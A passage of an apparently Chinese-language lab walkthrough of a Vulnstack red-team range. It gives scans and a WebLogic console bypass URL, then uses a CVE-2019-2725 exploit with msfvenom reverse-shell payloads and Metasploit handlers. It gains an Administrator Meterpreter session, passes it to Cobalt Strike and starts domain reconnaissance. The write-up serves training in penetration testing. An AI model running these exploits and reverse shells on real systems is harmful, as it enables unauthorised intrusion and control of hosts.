class=\"hljs-number\"\u003e1\u003c/span\u003e IP \u003cspan class=\"hljs-title function_ invoke__\"\u003eaddress\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned in \u003cspan class=\"hljs-number\"\u003e88.35\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫出系统版本\u003ccode\u003eMicrosoft Windows Server 2008 R2\u003c/code\u003e ，以及\u003ccode\u003eMSSQL\u003c/code\u003e ，\u003ccode\u003eOracle WebLogic Server 10.3.6.0\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7001\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e                                                                                                                                             \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:04 CST                                                                                                                                                \nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e                                                                                                                                                                               \nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.0012\u003c/span\u003es latency).                                                                                                                                                                                     \n                                                                                                                                                                                                                  \nPORT     STATE SERVICE                                                                                                                                                                                            \n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http                                                                                                                                                                                               \n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.                                                                                                                                                  \n|_http-dombased-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e DOM based XSS.                                                                                                                                                             \n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.                                                                                                                                                              \n135/tcp  open  msrpc                                                                                                                                                                                              \n139/tcp  open  netbios-ssn                                                                                                                                                                                        \n445/tcp  open  microsoft-ds                                                                                                                                                                                       \n1433/tcp open  ms-sql-s                                                                                                                                                                                           \n| ssl-poodle:                                                                                                                                                                                                     \n|   VULNERABLE:                                                                                                                                                                                                   \n|   SSL POODLE information leak                                                                                                                                                                                   \n|     State: VULNERABLE                                                                                                                                                                                           \n|     IDs:  BID:70574  CVE:CVE-2014-3566            \n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other                            \n|           products, uses nondeterministic CBC padding, which makes it easier                           \n|           for man-in-the-middle attackers to obtain cleartext data via a                               \n|           padding-oracle attack, aka the \"POODLE\" issue.                                               \n|     Disclosure date: 2014-10-14                   \n|     Check results:                                \n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA               \n|     References:                                   \n|       https://www.securityfocus.com/bid/70574     \n|       https://www.imperialviolet.org/2014/10/14/poodle.html                                            \n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566                                     \n|_      https://www.openssl.org/~bodo/ssl-poodle.pdf                                                     \n|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)                                      \n3389/tcp open  ms-wbt-server                        \n7001/tcp open  afs3-callback                        \nMAC Address: 00:0C:29:AC:FA:FB (VMware)             \n\nHost script results:                                \n| smb-vuln-ms17-010:                                \n|   VULNERABLE:                                     \n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                            \n|     State: VULNERABLE  \n|     IDs:  CVE:CVE-2017-0143                       \n|     Risk factor: HIGH                             \n|       A critical remote code execution vulnerability exists in Microsoft SMBv1                         \n|        servers (ms17-010).                        \n|                                                   \n|     Disclosure date: 2017-03-14                                                                        \n|     References:                                                                                        \n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                               \n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143                                     \n|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED        \n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED                                                      \n|_smb-vuln-ms10-054: false\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫出主机\u003ccode\u003ems17-010\u003c/code\u003e永恒之蓝，不过开放了\u003ccode\u003e445\u003c/code\u003e应该都会扫出来，以及\u003ccode\u003eCVE-2014-3566\u003c/code\u003e ，网上查阅说是信息泄露漏洞，\u003ccode\u003eweb\u003c/code\u003e的好像没有扫出扫描漏洞，但是我们知道\u003ccode\u003e7001\u003c/code\u003e端口上是\u003ccode\u003eWebLogic\u003c/code\u003e ，可以查阅它的漏洞\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://zh.wikipedia.org/wiki/%E8%B4%B5%E5%AE%BE%E7%8A%AC%E6%BC%8F%E6%B4%9E\"\u003ehttps://zh.wikipedia.org/wiki/%E8%B4%B5%E5%AE%BE%E7%8A%AC%E6%BC%8F%E6%B4%9E\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003ch3\u003e80端口\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页，是空页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试扫描目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt -x php,html,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt | grep -v \u003cspan class=\"hljs-string\"\u003e\"403\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e啥也没有扫出来，转\u003ccode\u003e7001\u003c/code\u003e端口\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e7001端口\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发现\u003ccode\u003e/console\u003c/code\u003e能够正常访问到\u003ccode\u003eweblogic\u003c/code\u003e控制台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以在右下角找到版本号\u003ccode\u003eWebLogic Server 版本: 10.3.6.0\u003c/code\u003e ，和之前\u003ccode\u003enmap\u003c/code\u003e扫描的一模一样\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查阅漏洞\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e通过\u003ccode\u003esearchexploit\u003c/code\u003e 搜索\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esearchsploit WebLogic \u003cspan class=\"hljs-number\"\u003e10.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                  |  Path\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nOracle Weblogic \u003cspan class=\"hljs-number\"\u003e10.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Remote Command Execution                                                                                                                           | java/webapps/\u003cspan class=\"hljs-number\"\u003e47895.\u003c/span\u003epy\nOracle Weblogic \u003cspan class=\"hljs-number\"\u003e10.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e12.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Remote Code Execution                                                                                                                 | windows/webapps/\u003cspan class=\"hljs-number\"\u003e46780.\u003c/span\u003epy\nOracle WebLogic Server \u003cspan class=\"hljs-number\"\u003e10.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Java Deserialization Remote Code Execution                                                                                                    | java/remote/\u003cspan class=\"hljs-number\"\u003e42806.\u003c/span\u003epy\nOracle Weblogic Server \u003cspan class=\"hljs-number\"\u003e10.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e12.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e12.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e12.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e - Deserialization Remote Command Execution                                                                     | multiple/remote/\u003cspan class=\"hljs-number\"\u003e44553.\u003c/span\u003epy\nOracle WebLogic Server \u003cspan class=\"hljs-number\"\u003e10.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e12.\u003c/span\u003ex - Remote Command Execution                                                                                                             | multiple/remote/\u003cspan class=\"hljs-number\"\u003e43392.\u003c/span\u003epy\nWebLogic Server \u003cspan class=\"hljs-number\"\u003e10.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e12.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e12.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e12.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e14.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Unauthenticated RCE via GET request                                                            | java/webapps/\u003cspan class=\"hljs-number\"\u003e48971.\u003c/span\u003epy\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在远程命令执行\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eweblogic权限绕过（CVE-2020-14882）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehttp://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7001\u003c/span\u003e/console/css/%252e%252e%252fconsole.portal\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能直接进入后台，但是权限很低，无法利用\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCVE-2019-2725 反序列化远程代码执行\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e拉取上面\u003ccode\u003esearchexploit\u003c/code\u003e 的搜索到的\u003ccode\u003e46780.py\u003c/code\u003e ，然后跟根据文件内部\u003ccode\u003eusage\u003c/code\u003e食用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# Script Usage:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# python exploit.py http://IP:PORT/_async/AsyncResponseServiceHttps\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=1234 -f psh-cmd \u003e exploit.ps1\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Add the powershell command in the variable\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e先通过\u003ccode\u003emsfvenom\u003c/code\u003e生成\u003ccode\u003epayload\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.150\u003c/span\u003e LPORT=\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -f psh-cmd \u003e exploit.ps1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后将文件\u003ccode\u003eexploit.ps1\u003c/code\u003e里面的内容替换到\u003ccode\u003e46780.py\u003c/code\u003e 的\u003ccode\u003eexploit\u003c/code\u003e变量中的\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 \u003e use exploit/multi/handler \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.150\u003c/span\u003e\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nmsf6 exploit(multi/handler) \u003e run\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e执行脚本\u003ccode\u003e46780.py\u003c/code\u003e ，要通过\u003ccode\u003epython2\u003c/code\u003e执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython2 \u003cspan class=\"hljs-number\"\u003e46780.\u003c/span\u003epy http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7001\u003c/span\u003e/_\u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e/AsyncResponseServiceHttps\nExploit Written by Avinash Kumar Thapa\nstatus_code:\u003cspan class=\"hljs-number\"\u003e202\u003c/span\u003e\n\u0026#x3C;Response [\u003cspan class=\"hljs-number\"\u003e202\u003c/span\u003e]\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e最后回到Kali可以发现反弹成功了，并且用户是\u003ccode\u003eDE1AY\\Administrator\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 \u003e use exploit/multi/handler \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.150\u003c/span\u003e\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nmsf6 exploit(multi/handler) \u003e run\n[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.150\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e \n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e176198\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e\n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.150\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49303\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e +0800\n\nmeterpreter \u003e getuid\nServer username: DE1AY\\Administrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e内网渗透\u003c/h2\u003e\n\u003ch3\u003eMSF派生CS\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e启动\u003ccode\u003eCS\u003c/code\u003e服务端，并用客户端连上\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eCS\u003c/code\u003e设置\u003ccode\u003eHTTP\u003c/code\u003e监听器\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eMSF使用\u003ccode\u003epayload_inject\u003c/code\u003e 模块\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e bg\n[*] Backgrounding session \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e..\nmsf6 exploit(multi/handler) \u003e use exploit/windows/local/payload_inject \nmsf6 exploit(windows/local/payload_inject) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/meterpreter/reverse_http\nmsf6 exploit(windows/local/payload_inject) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.150\u003c/span\u003e\nmsf6 exploit(windows/local/payload_inject) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\nmsf6 exploit(windows/local/payload_inject) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e disablepayloadhandler true \nmsf6 exploit(windows/local/payload_inject) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e prependmigrate true \nmsf6 exploit(windows/local/payload_inject) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nmsf6 exploit(windows/local/payload_inject) \u003e run\n[*] Running module against WEB\n[*] Spawned Notepad process \u003cspan class=\"hljs-number\"\u003e3584\u003c/span\u003e\n[*] Injecting payload into \u003cspan class=\"hljs-number\"\u003e3584\u003c/span\u003e\n[*] Preparing \u003cspan class=\"hljs-string\"\u003e'windows/meterpreter/reverse_http'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e PID \u003cspan class=\"hljs-number\"\u003e3584\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后回到CS就可以看到已经将主机派生过来了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image25.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e内网信息收寻\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e网络配置信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\u003eipconfig\nWindows IP Configuration\nEthernet adapter  \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::d153:9eef:2b9e:1c80%\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e\n   IPv4 Address. . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e\n   Subnet Mask . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n   Default Gateway . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nEthernet adapter :\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::\u003cspan class=\"hljs-number\"\u003e2836\u003c/span\u003e:b233:\u003cspan class=\"hljs-number\"\u003e6919\u003c/span\u003e:8d8a%\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e\n   IPv4 Address. . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e\n   Subnet Mask . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n   Default Gateway . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e外网网段\u003ccode\u003e192.168.111.0\u003c/code\u003e ，内网网段\u003ccode\u003e10.10.10.0\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进程信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# ps\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e2740\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2120\u003c/span\u003e  360Tray.exe                   x86   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e        DE1AY\\Administrator           C:\\Program Files (x86)\\\u003cspan class=\"hljs-number\"\u003e360\u003c/span\u003e\\360Safe\\safemon\\360Tray.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现安装了\u003ccode\u003e360\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e主机信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e sysinfo\nComputer        : WEB\nOS              : Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 (\u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e, Service Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e).\nArchitecture    : x64\nSystem Language : zh_CN\nDomain          : DE1AY\nLogged On Users : \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nMeterpreter     : x86/windows\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现存在域\u003ccode\u003eDE1AY\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看域详细信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebeacon\u003e shell net config workstation\n[*] Tasked beacon to run: net config workstation\n[+] host called home, sent: \u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n[+] received output:\n计算机名                     \\\\WEB\n计算机全名                   WEB.de1ay.com\n用户名                       Administrator\n\n工作站正运行于               \n\tNetBT_Tcpip_{D7E14072-49B9-45D3-BA8C-7955E6146CC2} (000C29ACFAFB)\n\tNetBT_Tcpip_{AD80CD23-D97F-\u003cspan 